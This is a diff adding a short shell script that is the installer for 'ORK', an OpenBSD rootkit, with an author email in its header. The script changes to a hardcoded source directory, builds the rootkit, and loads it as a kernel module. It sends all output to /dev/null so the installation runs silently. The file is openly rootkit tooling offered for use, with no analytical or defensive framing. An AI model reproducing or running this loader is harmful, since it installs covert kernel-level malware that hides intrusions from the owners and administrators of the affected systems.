@@ -1,0 +1,9 @@
+#!/bin/sh
+# ORK (Openbsd RootKit) v. 0.1
+# meder@areopag.net
+#
+# define ORKHOME to be the directory where ork is located
+
+ORKHOME=/home/meder/code/ork-0.1
+cd $ORKHOME
+make > /dev/null 2>&1 && make load > /dev/null 2>&1
